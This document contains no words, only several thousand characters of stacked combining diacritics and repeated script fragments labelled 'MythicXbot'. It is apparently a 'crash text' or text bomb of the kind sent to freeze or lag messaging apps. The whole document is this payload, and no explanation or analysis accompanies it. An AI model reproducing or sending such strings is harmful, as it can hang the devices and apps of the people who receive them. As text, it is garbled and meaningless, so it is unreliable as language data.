๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicX🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.